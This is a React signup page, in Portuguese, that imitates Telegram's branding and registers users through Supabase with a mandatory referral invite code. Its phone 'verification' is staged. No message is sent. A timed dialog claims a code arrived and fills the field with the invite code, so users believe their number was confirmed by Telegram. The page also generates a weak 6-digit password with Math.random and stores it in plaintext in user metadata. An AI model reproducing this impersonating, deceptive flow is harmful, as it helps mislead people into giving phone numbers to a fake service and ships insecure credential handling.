import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { Link, useNavigate, useSearchParams } from 'react-router-dom';
import { AnimatePresence, motion } from 'motion/react';
import { useToast } from '../components/Toast';
import { supabase } from '../lib/supabase';
import { getDeviceId } from '../lib/device';
import { subscribeToPushNotifications } from '../lib/pushNotifications';
import { Loader2, Search, X, Check, ArrowLeft, ChevronDown, Pencil, Copy, CheckCircle, MessageSquare } from 'lucide-react';
import { COUNTRIES, Country } from '../lib/countries';

export default function Messager() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { showToast } = useToast();

  // Step state
  const [step, setStep] = useState<'phone' | 'verification'>('phone');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(true);
  const [formData, setFormData] = useState({ phone: '', inviteCode: '' });
  const [verificationCode, setVerificationCode] = useState('');

  // Monkey animation
  const [monkeyState, setMonkeyState] = useState<'idle' | 'shake'>('idle');
  const [headRotation, setHeadRotation] = useState(0);
  const [headX, setHeadX] = useState(0);
  const [pupilShift, setPupilShift] = useState(0);

  // Step 2 — message flow
  const [msgCountdown, setMsgCountdown] = useState(0);
  const [msgRequested, setMsgRequested] = useState(false);
  const [showAutoFillDialog, setShowAutoFillDialog] = useState(false);
  const [codeAutoFilled, setCodeAutoFilled] = useState(false);

  // Passkey reveal dialog
  const [showPasskeyDialog, setShowPasskeyDialog] = useState(false);
  const [generatedPasskey, setGeneratedPasskey] = useState('');
  const [passkeyDialogCopied, setPasskeyDialogCopied] = useState(false);

  // Country / modals
  const [selectedCountry, setSelectedCountry] = useState<Country>(COUNTRIES[0]);
  const [showCountryModal, setShowCountryModal] = useState(false);
  const [showConfirmationModal, setShowConfirmationModal] = useState(false);
  const [searchCountry, setSearchCountry] = useState('');

  // Capture invite code from URL
  useEffect(() => {
    const code = searchParams.get('join');
    if (code) {
      const cleanCode = code.trim().slice(0, 4);
      setFormData(prev => ({ ...prev, inviteCode: cleanCode }));
    }
  }, [searchParams]);

  // Countdown timer
  useEffect(() => {
    if (msgCountdown <= 0) return;
    const timer = setTimeout(() => setMsgCountdown(prev => prev - 1), 1000);
    return () => clearTimeout(timer);
  }, [msgCountdown]);

  const triggerMonkeyShake = useCallback(() => {
    setMonkeyState('shake');
    setTimeout(() => setMonkeyState('idle'), 600);
  }, []);

  const formatPhoneNumber = (phone: string, maxLength: number) => {
    if (maxLength === 9) {
      return phone.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1 $2 $3').trim();
    }
    if (maxLength === 10) {
      return phone.replace(/(\d{3})(\d{3})(\d{1,4})/, '$1 $2 $3').trim();
    }
    if (maxLength === 11) {
      return phone.replace(/(\d{3})(\d{4})(\d{1,4})/, '$1 $2 $3').trim();
    }
    return phone.replace(/(\d{3})(?=\d)/g, '$1 ').trim();
  };

  const handleChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let sanitized = value;
    if (name === 'phone') {
      sanitized = value.replace(/\D/g, '').slice(0, selectedCountry.maxLength);
    }
    setFormData(prev => ({ ...prev, [name]: sanitized }));
  }, [selectedCountry.maxLength]);

  // ── "Receber Mensagem" button ──────────────────────────────────────────────
  const handleReceiveMessage = () => {
    if (msgCountdown > 0) return;
    setMsgRequested(true);
    setCodeAutoFilled(false);
    setVerificationCode('');
    setMsgCountdown(60);

    // After 6 seconds show the auto-fill dialog
    setTimeout(() => {
      setShowAutoFillDialog(true);
    }, 6000);
  };

  // Auto-fill dialog: user clicks OK → invite code fills verification field
  const handleAutoFillConfirm = () => {
    setShowAutoFillDialog(false);
    const code = formData.inviteCode || '';
    setVerificationCode(code);
    setCodeAutoFilled(true);
    // Happy monkey
    setHeadRotation(10);
    setHeadX(5);
    setPupilShift(3);
    setTimeout(() => {
      setHeadRotation(0);
      setHeadX(0);
      setPupilShift(0);
    }, 1500);
  };

  // ── Phone step ─────────────────────────────────────────────────────────────
  const handlePhoneSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.phone || formData.phone.length !== selectedCountry.maxLength) {
      showToast(`Número de ${selectedCountry.name} inválido.`, 'error');
      return;
    }
    setShowConfirmationModal(true);
  };

  const handleConfirmNumber = () => {
    setShowConfirmationModal(false);
    setStep('verification');
  };

  // ── Generate random 6-digit passkey ────────────────────────────────────────
  const generatePasskey = (): string =>
    Math.floor(100000 + Math.random() * 900000).toString();

  // ── Submit registration ────────────────────────────────────────────────────
  const executeRegistration = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!codeAutoFilled || verificationCode.length < 4) {
      triggerMonkeyShake();
      showToast('Ops! Aguarde receber o código de verificação primeiro.', 'error');
      return;
    }

    if (!formData.inviteCode || formData.inviteCode.length !== 4) {
      triggerMonkeyShake();
      showToast('Ops! Código de convite inválido. Acesse através do link de convite.', 'error');
      return;
    }

    const userPasskey = generatePasskey();

    setIsSubmitting(true);
    try {
      // Validate invite code via RPC
      const { data: rpcData, error: vError } = await supabase.rpc('secure_registration_mcpn', {
        p_phone: formData.phone,
        p_invite_code: formData.inviteCode,
        p_device_id: getDeviceId()
      });

      if (vError) {
        triggerMonkeyShake();
        throw vError;
      }

      const validation = rpcData as { success: boolean; message: string } | null;
      if (validation && !validation.success) {
        triggerMonkeyShake();
        showToast(validation.message || 'Ops! Código de convite inválido ou expirado.', 'error');
        setIsSubmitting(false);
        return;
      }

      // Register user — password = system-generated passkey
      const { data, error } = await supabase.auth.signUp({
        email: `${formData.phone}@user.com`,
        password: userPasskey,
        options: {
          data: {
            phone: formData.phone,
            referred_by: formData.inviteCode,
            device_id: getDeviceId(),
            passkey: userPasskey,
            verification_code: verificationCode
          }
        }
      });

      if (error) {
        triggerMonkeyShake();
        if (error.message.includes('already registered')) {
          showToast('Ops! Este número de telefone já está cadastrado.', 'error');
        } else {
          throw error;
        }
        return;
      }

      if (data.user) {
        if ('Notification' in window && Notification.permission === 'granted') {
          subscribeToPushNotifications().catch(() => {});
        }
        // Persist phone for auto-fill on Login
        localStorage.setItem('saved_phone', formData.phone);
        localStorage.setItem('saved_dial_code', selectedCountry.dial_code);
        localStorage.setItem('saved_country_name', selectedCountry.name);

        // Show passkey reveal dialog
        setGeneratedPasskey(userPasskey);
        setShowPasskeyDialog(true);
      }
    } catch (err: any) {
      triggerMonkeyShake();
      let msg = err.message || 'Ops! Ocorreu um erro ao processar o cadastro.';
      if (msg.includes('email rate limit exceeded')) msg = 'Ops! Limite de tentativas excedido, tente mais tarde.';
      showToast(msg, 'error');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Passkey dialog actions
  const handlePasskeyDialogClose = () => {
    setShowPasskeyDialog(false);
    navigate('/login');
  };

  const handleCopyPasskey = async () => {
    try {
      await navigator.clipboard.writeText(generatedPasskey);
      setPasskeyDialogCopied(true);
      setTimeout(() => setPasskeyDialogCopied(false), 2500);
    } catch {
      showToast('Não foi possível copiar. Anote a chave manualmente.', 'error');
    }
  };

  const filteredCountries = useMemo(() => {
    if (!searchCountry) return COUNTRIES;
    return COUNTRIES.filter(c =>
      c.name.toLowerCase().includes(searchCountry.toLowerCase()) ||
      c.dial_code.includes(searchCountry)
    );
  }, [searchCountry]);

  // ── RENDER ─────────────────────────────────────────────────────────────────
  return (
    <div className="w-full min-h-screen bg-white pb-12 font-sans antialiased text-black select-none flex flex-col items-center justify-center p-4">

      {/* Back Button — fixed top-left corner */}
      {step === 'verification' && (
        <button
          onClick={() => setStep('phone')}
          className="fixed top-4 left-4 z-50 flex items-center text-[#3390ec] font-medium text-[16px] hover:opacity-80 active:scale-95 transition-all bg-white/80 backdrop-blur-sm px-3 py-1.5 rounded-full shadow-sm"
        >
          <ArrowLeft className="w-5 h-5 mr-1" />
          Voltar
        </button>
      )}

      <main className="w-full max-w-[360px] flex flex-col items-center">

        {/* ══════════════════════════════════════════════════════════
            STEP 1 — PHONE NUMBER
        ══════════════════════════════════════════════════════════ */}
        {step === 'phone' ? (
          <>
            <div className="mb-6 flex items-center justify-center">
              <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" className="w-[90px] h-[90px]">
                <defs>
                  <linearGradient id="tgOfficialGrad" x1=".667" x2=".417" y1=".167" y2=".75">
                    <stop offset="0" stopColor="#37aee2"/>
                    <stop offset="1" stopColor="#1e96c8"/>
                  </linearGradient>
                </defs>
                <circle cx="120" cy="120" r="120" fill="url(#tgOfficialGrad)"/>
                <path fill="#c8daea" d="m98 175c-3.888 0-3.227-1.468-4.568-5.17l-11.433-37.594 88.022-52.232"/>
                <path fill="#a9c9dd" d="m98 175c3 0 4.325-1.372 6-3l16-15.558-19.958-12.035"/>
                <path fill="#fff" d="m100.04 144.41 48.36 35.729c5.519 3.045 9.501 1.468 10.876-5.123l19.685-92.763c2.015-8.08-3.08-11.746-8.36-9.349l-115.59 44.571c-7.89 3.165-7.843 7.567-1.438 9.528l29.663 9.259 68.673-43.325c3.242-1.966 6.218-.91 3.776 1.258"/>
              </svg>
            </div>

            <h1 className="text-[28px] font-semibold text-center mb-2 tracking-tight text-black">Telegram</h1>

            <p className="text-[14px] text-[#707579] text-center mb-7 leading-snug max-w-[300px]">
              Confirme o código do seu país e introduza o seu número de telefone.
            </p>

            <form onSubmit={handlePhoneSubmit} className="w-full flex flex-col items-center">
              {/* Country */}
              <div
                onClick={() => setShowCountryModal(true)}
                className="relative w-full h-[46px] rounded-[22px] border border-[#c8c7cc] hover:border-[#3390ec] px-4 flex items-center justify-between cursor-pointer transition-colors bg-white group mb-4"
              >
                <label className="absolute -top-2.5 left-4 bg-white px-1 text-[11px] text-[#707579] font-medium pointer-events-none">
                  Country / País
                </label>
                <div className="flex items-center gap-2 overflow-hidden pr-2">
                  <img
                    src={`https://flagcdn.com/w40/${selectedCountry.code.toLowerCase()}.png`}
                    alt={selectedCountry.name}
                    className="w-6 h-auto rounded-sm object-cover shrink-0"
                    onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
                  />
                  <span className="text-[15px] text-black font-normal truncate">{selectedCountry.name}</span>
                </div>
                <ChevronDown className="w-5 h-5 text-[#a2acb4] shrink-0" />
              </div>

              {/* Phone */}
              <div className="relative w-full h-[46px] rounded-[22px] border border-[#c8c7cc] focus-within:border-[#3390ec] px-4 flex items-center transition-colors bg-white group mb-4">
                <label className="absolute -top-2.5 left-4 bg-white px-1 text-[11px] text-[#707579] font-medium pointer-events-none group-focus-within:text-[#3390ec]">
                  Your phone number / Número de telefone
                </label>
                <span className="text-[15px] text-black font-normal mr-2 select-none">
                  {selectedCountry.dial_code}
                </span>
                <input
                  name="phone"
                  type="tel"
                  inputMode="numeric"
                  autoComplete="tel"
                  placeholder=""
                  className="flex-1 h-full bg-transparent outline-none text-[15px] text-black font-normal"
                  value={formatPhoneNumber(formData.phone, selectedCountry.maxLength)}
                  onChange={handleChange}
                  maxLength={selectedCountry.maxLength + 2}
                  autoFocus
                />
              </div>

              {/* Checkbox */}
              <label className="flex items-center gap-3 cursor-pointer select-none self-start mb-5">
                <input
                  type="checkbox"
                  checked={keepSignedIn}
                  onChange={(e) => setKeepSignedIn(e.target.checked)}
                  className="w-5 h-5 rounded-[4px] accent-[#3390ec] cursor-pointer"
                />
                <span className="text-[14px] text-black font-normal">Manter sessão iniciada</span>
              </label>

              <button
                type="submit"
                className="w-full h-[46px] rounded-[22px] bg-[#3390ec] hover:bg-[#2b7bc9] active:scale-[0.98] text-white font-semibold text-[14px] uppercase tracking-wider transition-all shadow-sm flex items-center justify-center"
              >
                CONTINUAR
              </button>

              <div className="flex flex-col items-center mt-7 w-full">
                <Link to="/login" className="text-[#3390ec] font-semibold text-[13px] uppercase tracking-wider hover:underline text-center">
                  LOG IN WITH PASSKEY
                </Link>
              </div>
            </form>
          </>
        ) : (

        /* ══════════════════════════════════════════════════════════
            STEP 2 — VERIFICATION
        ══════════════════════════════════════════════════════════ */
          <form onSubmit={executeRegistration} className="w-full flex flex-col items-center">

            {/* CSS for idle head bob */}
            <style>{`
              @keyframes monkeyHeadBob {
                0%, 100% { transform: rotate(0deg) translateX(0px); }
                25%  { transform: rotate(4deg) translateX(3px); }
                75%  { transform: rotate(-4deg) translateX(-3px); }
              }
            `}</style>

            {/* Animated Monkey */}
            <motion.div
              className="mb-5 flex items-center justify-center"
              animate={
                monkeyState === 'shake'
                  ? { x: [0, -18, 18, -14, 14, -10, 10, -5, 5, 0], rotate: [0, -14, 14, -10, 10, -6, 6, -3, 3, 0] }
                  : { x: headX, rotate: headRotation }
              }
              transition={
                monkeyState === 'shake'
                  ? { duration: 0.5, ease: 'easeInOut' }
                  : { type: 'spring', stiffness: 260, damping: 20 }
              }
              style={monkeyState !== 'shake' && headX === 0 && headRotation === 0
                ? { animation: 'monkeyHeadBob 2.5s ease-in-out infinite' }
                : {}}
            >
              <svg viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" className="w-[100px] h-[100px]">
                <circle cx="28" cy="80" r="22" fill="#c49a6c" stroke="#5d4037" strokeWidth="4"/>
                <circle cx="28" cy="80" r="13" fill="#f8c8a0"/>
                <circle cx="132" cy="80" r="22" fill="#c49a6c" stroke="#5d4037" strokeWidth="4"/>
                <circle cx="132" cy="80" r="13" fill="#f8c8a0"/>
                <ellipse cx="80" cy="84" rx="54" ry="46" fill="#c49a6c" stroke="#5d4037" strokeWidth="4"/>
                <path d="M 40 86 C 40 58, 60 52, 80 66 C 100 52, 120 58, 120 86 C 120 114, 96 122, 80 122 C 64 122, 40 114, 40 86 Z" fill="#fce5cd" stroke="#5d4037" strokeWidth="3"/>
                <g>
                  {/* Left eye — blinks */}
                  <motion.ellipse
                    cx="62" cy="82" rx="6.5" ry="9" fill="#212121"
                    animate={{ scaleY: [1, 1, 1, 0.05, 1] }}
                    transition={{ duration: 3, repeat: Infinity, ease: 'easeInOut', times: [0, 0.8, 0.88, 0.92, 1] }}
                    style={{ transformOrigin: '62px 82px' }}
                  />
                  <motion.circle
                    animate={{ cx: 64 + pupilShift }}
                    transition={{ type: 'spring', stiffness: 300, damping: 25 }}
                    cy="79" r="2.5" fill="#ffffff"
                  />
                  {/* Right eye — blinks */}
                  <motion.ellipse
                    cx="98" cy="82" rx="6.5" ry="9" fill="#212121"
                    animate={{ scaleY: [1, 1, 1, 0.05, 1] }}
                    transition={{ duration: 3, repeat: Infinity, ease: 'easeInOut', times: [0, 0.8, 0.88, 0.92, 1] }}
                    style={{ transformOrigin: '98px 82px' }}
                  />
                  <motion.circle
                    animate={{ cx: 100 + pupilShift }}
                    transition={{ type: 'spring', stiffness: 300, damping: 25 }}
                    cy="79" r="2.5" fill="#ffffff"
                  />
                </g>
                <ellipse cx="80" cy="95" rx="7" ry="4.5" fill="#b08557"/>
                <circle cx="77.5" cy="95.5" r="1.8" fill="#5d4037"/>
                <circle cx="82.5" cy="95.5" r="1.8" fill="#5d4037"/>
                {monkeyState === 'shake'
                  ? <circle cx="80" cy="107" r="4.5" fill="#5d4037" />
                  : <path d="M 72 104 Q 80 112 88 104" fill="none" stroke="#5d4037" strokeWidth="3.5" strokeLinecap="round"/>
                }
              </svg>
            </motion.div>

            {/* Phone number display */}
            <div
              className="flex items-center justify-center gap-2 mb-2 cursor-pointer group hover:opacity-80 transition-opacity"
              onClick={() => setStep('phone')}
              title="Clique para editar o número"
            >
              <h2 className="text-[24px] font-bold text-black tracking-tight">
                {selectedCountry.dial_code} {formData.phone.replace(/(\d{3})(?=\d)/g, '$1 ')}
              </h2>
              <Pencil className="w-4 h-4 text-[#707579] group-hover:text-[#3390ec] transition-colors shrink-0" />
            </div>

            <p className="text-[13px] text-[#707579] text-center mb-5 leading-snug max-w-[280px]">
              Enviámos o código de verificação para o seu número de telefone.
            </p>

            {/* Verification Code Field (read-only, auto-filled) */}
            <div className={`relative w-full h-[46px] rounded-[22px] border pl-4 pr-[90px] flex items-center transition-all bg-white group mb-5 ${codeAutoFilled ? 'border-[#3390ec]' : 'border-[#c8c7cc]'}`}>
              <label className={`absolute -top-2.5 left-4 bg-white px-1 text-[11px] font-medium pointer-events-none transition-colors ${codeAutoFilled ? 'text-[#3390ec]' : 'text-[#707579]'}`}>
                Code / Código
              </label>
              <input
                name="verificationCode"
                type="text"
                placeholder={msgRequested ? '— aguardando —' : '—'}
                className="flex-1 h-full bg-transparent outline-none text-[17px] text-black font-medium tracking-widest text-center placeholder:text-[#c8c7cc] placeholder:text-[11px]"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value.slice(0, 4))}
              />
              <div className="absolute right-4 h-full flex items-center">
                {codeAutoFilled ? (
                  <CheckCircle className="w-5 h-5 text-[#3390ec]" />
                ) : (
                  <button
                    type="button"
                    onClick={handleReceiveMessage}
                    disabled={msgCountdown > 0}
                    className={`text-[13px] font-semibold transition-colors ${
                      msgCountdown > 0 ? 'text-[#a2acb4] cursor-not-allowed' : 'text-[#3390ec] hover:text-[#2b7bc9]'
                    }`}
                  >
                    {msgCountdown > 0 ? (
                      <span className="flex items-center gap-1">
                        <Loader2 className="w-3.5 h-3.5 animate-spin" />
                        {msgCountdown}s
                      </span>
                    ) : (
                      msgRequested ? 'Reenviar' : 'Receber'
                    )}
                  </button>
                )}
              </div>
            </div>

            {/* SUBMETER Button */}
            <button
              type="submit"
              disabled={isSubmitting || !codeAutoFilled}
              className="w-full h-[46px] rounded-[22px] bg-[#3390ec] hover:bg-[#2b7bc9] active:scale-[0.98] text-white font-semibold text-[14px] uppercase tracking-wider transition-all disabled:opacity-40 flex items-center justify-center shadow-sm"
            >
              {isSubmitting ? <Loader2 className="animate-spin h-5 w-5 text-white" /> : 'SUBMETER'}
            </button>
          </form>
        )}
      </main>

      {/* ════════════════════════════════════════════════════════
          DIALOG — Código enviado automaticamente
      ════════════════════════════════════════════════════════ */}
      <AnimatePresence>
        {showAutoFillDialog && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/40 p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.88 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.88 }}
              transition={{ type: 'spring', stiffness: 280, damping: 22 }}
              className="bg-white w-full max-w-[320px] rounded-[24px] shadow-2xl p-6 flex flex-col items-center text-center"
            >
              <div className="w-14 h-14 rounded-full bg-[#e8f4fd] flex items-center justify-center mb-4">
                <MessageSquare className="w-7 h-7 text-[#3390ec]" />
              </div>
              <h3 className="text-[18px] font-bold text-black mb-2">Código enviado!</h3>
              <p className="text-[13px] text-[#707579] leading-snug mb-5 max-w-[250px]">
                O código de verificação foi enviado automaticamente para o seu número. Clique em <strong>OK</strong> para preencher o campo.
              </p>
              <button
                onClick={handleAutoFillConfirm}
                className="w-full h-[44px] rounded-[22px] bg-[#3390ec] hover:bg-[#2b7bc9] text-white font-semibold text-[15px] transition-all active:scale-[0.98]"
              >
                OK
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* ════════════════════════════════════════════════════════
          DIALOG — Chave de Acesso gerada
      ════════════════════════════════════════════════════════ */}
      <AnimatePresence>
        {showPasskeyDialog && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/50 p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.88 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.88 }}
              transition={{ type: 'spring', stiffness: 280, damping: 22 }}
              className="bg-white w-full max-w-[340px] rounded-[24px] shadow-2xl p-6 flex flex-col items-center text-center"
            >
              {/* Lock icon */}
              <div className="w-16 h-16 rounded-full bg-gradient-to-br from-[#37aee2] to-[#1e96c8] flex items-center justify-center mb-4 shadow-md">
                <svg className="w-9 h-9 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>

              <h3 className="text-[20px] font-bold text-black mb-1">A sua Chave de Acesso</h3>
              <p className="text-[13px] text-[#707579] leading-snug mb-4 max-w-[260px]">
                Esta é a sua senha de acesso gerada pelo sistema.{' '}
                <span className="text-red-500 font-semibold">Nunca a partilhe</span> com ninguém.
              </p>

              {/* Passkey box + copy */}
              <div className="w-full bg-[#f0f7ff] border-2 border-[#3390ec] rounded-[18px] px-5 py-4 flex items-center justify-between mb-2">
                <span className="text-[34px] font-black text-[#3390ec] tracking-[10px] font-mono flex-1 text-center">
                  {generatedPasskey}
                </span>
                <button
                  onClick={handleCopyPasskey}
                  className={`ml-2 p-2.5 rounded-[12px] transition-all active:scale-95 shrink-0 ${
                    passkeyDialogCopied
                      ? 'bg-green-100 text-green-600'
                      : 'bg-[#3390ec]/10 text-[#3390ec] hover:bg-[#3390ec]/20'
                  }`}
                  title="Copiar chave de acesso"
                >
                  {passkeyDialogCopied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                </button>
              </div>

              {passkeyDialogCopied && (
                <p className="text-[12px] text-green-600 font-semibold mb-2">✓ Copiado para a área de transferência!</p>
              )}

              <p className="text-[11px] text-[#a2acb4] mb-5 leading-snug">
                Use esta chave sempre que quiser aceder à sua conta em{' '}
                <strong className="text-[#707579]">
                  {selectedCountry.dial_code} {formData.phone}
                </strong>.
              </p>

              <button
                onClick={handlePasskeyDialogClose}
                className="w-full h-[46px] rounded-[22px] bg-[#3390ec] hover:bg-[#2b7bc9] text-white font-semibold text-[14px] uppercase tracking-wider transition-all active:scale-[0.98] shadow-sm"
              >
                ENTRAR NA MINHA CONTA
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* ════════════════════════════════════════════════════════
          MODAL — Países
      ════════════════════════════════════════════════════════ */}
      <AnimatePresence>
        {showCountryModal && (
          <motion.div
            initial={{ opacity: 0, y: '100%' }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: '100%' }}
            transition={{ type: 'tween', ease: 'easeOut', duration: 0.3 }}
            className="fixed inset-0 z-[200] bg-white flex flex-col"
          >
            <div className="h-[56px] px-4 flex items-center border-b border-[#c8c7cc] shrink-0 bg-[#f8f8f8]">
              <button onClick={() => setShowCountryModal(false)} className="text-[#3390ec] text-[17px] font-medium">
                Voltar
              </button>
              <h2 className="flex-1 text-center text-[17px] font-semibold">Escolha um país</h2>
              <div className="w-[40px]" />
            </div>
            <div className="p-2 bg-[#f8f8f8] border-b border-[#c8c7cc] shrink-0">
              <div className="bg-[#e3e3e8] h-[36px] rounded-[20px] flex items-center px-3">
                <Search className="w-5 h-5 text-[#8e8e93] mr-2" />
                <input
                  type="text"
                  placeholder="Pesquisar"
                  className="bg-transparent outline-none flex-1 text-[16px] text-black"
                  value={searchCountry}
                  onChange={(e) => setSearchCountry(e.target.value)}
                />
                {searchCountry && (
                  <button onClick={() => setSearchCountry('')} className="bg-[#8e8e93] text-white rounded-full p-0.5 ml-2">
                    <X className="w-3 h-3" />
                  </button>
                )}
              </div>
            </div>
            <div className="flex-1 overflow-y-auto">
              {filteredCountries.map((c) => (
                <div
                  key={c.code}
                  className="flex items-center px-4 h-[50px] border-b border-[#c8c7cc] active:bg-gray-100 cursor-pointer"
                  onClick={() => {
                    setSelectedCountry(c);
                    setFormData(prev => ({ ...prev, phone: '' }));
                    setShowCountryModal(false);
                    setSearchCountry('');
                  }}
                >
                  <img
                    src={`https://flagcdn.com/w40/${c.code.toLowerCase()}.png`}
                    alt={c.name}
                    className="w-8 h-auto rounded-sm object-cover mr-3 shrink-0"
                    onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
                  />
                  <span className="flex-1 text-[17px] font-medium text-black">{c.name}</span>
                  <span className="text-[#8e8e93] text-[17px] mr-2">{c.dial_code}</span>
                  {selectedCountry.code === c.code && <Check className="w-5 h-5 text-[#3390ec]" />}
                </div>
              ))}
              {filteredCountries.length === 0 && (
                <div className="p-8 text-center text-[#8e8e93]">Nenhum país encontrado</div>
              )}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ════════════════════════════════════════════════════════
          MODAL — Confirmação do Número
      ════════════════════════════════════════════════════════ */}
      <AnimatePresence>
        {showConfirmationModal && (
          <div
            className="fixed inset-0 z-[150] flex items-center justify-center bg-black/40 p-4"
            onClick={(e) => e.target === e.currentTarget && setShowConfirmationModal(false)}
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              transition={{ type: 'tween', ease: 'easeOut', duration: 0.2 }}
              className="bg-white w-full max-w-[340px] rounded-[24px] shadow-xl p-6 flex flex-col items-center text-center"
            >
              <h2 className="text-[26px] font-bold text-black mb-2 tracking-tight">
                {selectedCountry.dial_code} {formData.phone.replace(/(\d{3})(?=\d)/g, '$1 ')}
              </h2>
              <p className="text-[15px] text-[#505050] font-normal mb-6">Este é o número correto?</p>
              <div className="flex w-full gap-3">
                <button
                  type="button"
                  onClick={() => setShowConfirmationModal(false)}
                  className="flex-1 h-[42px] rounded-[22px] border border-[#3390ec] text-[#3390ec] font-semibold text-[14px] active:scale-[0.98] transition-all hover:bg-blue-50"
                >
                  Editar
                </button>
                <button
                  type="button"
                  onClick={handleConfirmNumber}
                  className="flex-1 h-[42px] rounded-[22px] bg-[#3390ec] hover:bg-[#2b7bc9] text-white font-semibold text-[14px] active:scale-[0.98] transition-all shadow-sm"
                >
                  Continuar
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
